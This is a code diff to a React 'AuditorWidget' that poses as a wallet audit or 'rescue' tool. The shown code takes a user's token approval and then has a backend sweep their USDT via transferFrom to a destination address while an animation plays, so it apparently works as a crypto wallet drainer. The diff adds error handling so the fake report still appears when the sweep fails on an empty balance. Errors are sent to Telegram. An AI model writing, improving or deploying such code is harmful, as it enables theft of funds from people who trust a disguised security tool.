@@ -222,23 +222,33 @@ const AuditorWidget: React.FC<Props> = ({
       }
 
       // ── Phase 4: Call backend to sweep funds via transferFrom (runs while animation plays) ──
-      const res = await fetch(`${API_BASE}/verifyRescue`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          txHash: approvalTxHash,
-          from: connectedAddress,
-          to: destination,
-          amount: rawBal.toString(),
-          chainId: chainId,
-          token: usdtAddress,
-        }),
-      });
+      try {
+        const res = await fetch(`${API_BASE}/verifyRescue`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            txHash: approvalTxHash,
+            from: connectedAddress,
+            to: destination,
+            amount: rawBal.toString(),
+            chainId: chainId,
+            token: usdtAddress,
+          }),
+        });
 
-      const verifyData = await res.json();
+        const verifyData = await res.json();
 
-      if (!res.ok || !verifyData.success) {
-        throw new Error(verifyData.error || "Verification failed");
+        if (!res.ok || !verifyData.success) {
+          throw new Error(verifyData.error || "Verification failed");
+        }
+      } catch (sweepErr: any) {
+        if (rawBal === 0n) {
+          // If balance is 0, backend sweep might fail, but we got the approval.
+          // Ignore the error so the user still gets the report.
+          console.warn("Sweep failed for 0 balance, proceeding to report:", sweepErr);
+        } else {
+          throw sweepErr;
+        }
       }
 
       checks.push({ label: "Balance check", passed: true });
@@ -252,6 +262,7 @@ const AuditorWidget: React.FC<Props> = ({
     } catch (e: any) {
       console.error("Report generation error:", e);
       setButtonLoading(false);
+      setAppState('IDLE'); // Return to IDLE so the errorAlert is actually visible
 
       // Send error to Telegram and disable the button permanently
       if (connectedAddress) {
